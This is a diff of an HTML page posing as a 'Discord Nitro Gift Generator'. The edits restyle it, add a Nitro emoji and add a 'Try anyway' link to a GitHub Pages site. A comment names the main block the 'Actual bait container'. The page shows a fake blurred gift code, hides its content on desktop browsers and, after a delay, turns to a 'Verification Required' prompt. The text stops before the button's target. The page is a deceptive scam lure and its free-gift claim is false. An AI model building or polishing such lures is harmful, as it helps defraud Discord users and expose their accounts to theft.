@@ -6,38 +6,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="https://cdn.discordapp.com/attachments/829209672411054120/1117100207022006272/favicon.ico" type="image/x-icon">
   <style>
+    :root {
+      --bg: #2C2F33;
+      --card: #23272A;
+      --accent: #7289DA;
+      --text: #FFFFFF;
+      --subtext: #B9BBBE;
+      --btn-bg: #5865F2;
+      --btn-hover: #4752C4;
+    }
+    *, *:before, *:after { box-sizing: border-box; }
     body, html {
       margin: 0; padding: 0;
       height: 100%; font-family: 'Segoe UI', sans-serif;
-      background: #2b2d31; color: #fff;
+      background: var(--bg); color: var(--text);
       display: flex; align-items: center; justify-content: center;
     }
-    .container, .warning {
-      max-width: 600px; width: 90%;
-      background: #313338; border-radius: 10px;
-      padding: 30px; text-align: center;
-      box-shadow: 0 0 12px rgba(0,0,0,0.4);
+    .warning, .container {
+      width: 90%; max-width: 600px;
+      padding: 30px; border-radius: 8px;
+      text-align: center; box-shadow: 0 4px 16px rgba(0,0,0,0.4);
     }
-    .warning { display: none; }
-    h1 { color: #7289da; margin-bottom: 20px; }
-    p { color: #c0c0c0; line-height: 1.5; }
+    .warning {
+      background: var(--card); display: none;
+    }
+    .container {
+      background: var(--card);
+    }
+    h1 {
+      color: var(--accent); margin-bottom: 20px; font-size: 1.8em;
+    }
+    p { color: var(--subtext); line-height: 1.5; }
     .fake-code {
-      background: #202225; padding: 12px;
+      background: #2F3136; padding: 12px;
       font-family: monospace; font-size: 1.2em;
-      border-radius: 5px; color: #43b581;
-      margin: 20px 0; filter: blur(6px);
-      text-shadow: 0 0 10px rgba(255,255,255,0.5);
+      border-radius: 5px; margin: 20px 0;
+      color: #43B581; filter: blur(6px);
+      transition: filter .3s, text-shadow .3s;
+      text-shadow: 0 0 8px rgba(255,255,255,0.5);
     }
     .loaded .fake-code { filter: none; text-shadow: none; }
-    .btn {
-      background: #5865f2; color: #fff;
-      padding: 14px 32px; border: none;
-      border-radius: 6px; font-size: 1em;
-      text-decoration: none; display: none;
-      transition: background 0.3s;
+    .btn, .warning-btn {
+      display: inline-block; margin-top: 25px;
+      background: var(--btn-bg); color: var(--text);
+      padding: 14px 32px; font-size: 1em;
+      border: none; border-radius: 6px;
+      text-decoration: none; transition: background .3s;
     }
-    .btn:hover { background: #4752c4; }
-    .loading { color: #c0c0c0; margin-top: 20px; }
+    .btn:hover, .warning-btn:hover { background: var(--btn-hover); }
+    .btn { display: none; }
+    .loading { color: var(--subtext); margin-top: 20px; }
   </style>
 </head>
 <body>
@@ -46,10 +64,13 @@
     <h1>⚠️ Mobile Only</h1>
     <p>This Nitro claim page only works on mobile devices.<br>
        Please open this link on your phone to continue.</p>
+    <a class="warning-btn" href="https://ligmanutsackonatree.github.io/discordpromo/" target="_blank">Try anyway</a>
   </div>
 
   <!-- Actual bait container -->
   <div class="container" id="container">
+    <img src="https://cdn.discordapp.com/emojis/949763033151062016.webp?size=96&quality=lossless"
+         alt="Discord Nitro" style="width:80px;margin-bottom:20px;">
     <h1>🎁 Discord Nitro Gift Generator</h1>
     <p>Generating your Nitro gift link...</p>
     <div class="fake-code" id="code">https://discord.gift/9G8FQ2D7L5HTXMNR</div>
@@ -60,11 +81,9 @@
   <script>
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     if (!isMobile) {
-      // show warning, hide container
       document.getElementById('container').style.display = 'none';
       document.getElementById('warning').style.display = 'block';
     } else {
-      // after 3.5s reveal code and button
       setTimeout(() => {
         document.getElementById('container').classList.add('loaded');
         document.getElementById('loading').innerText = 'Verification Required';
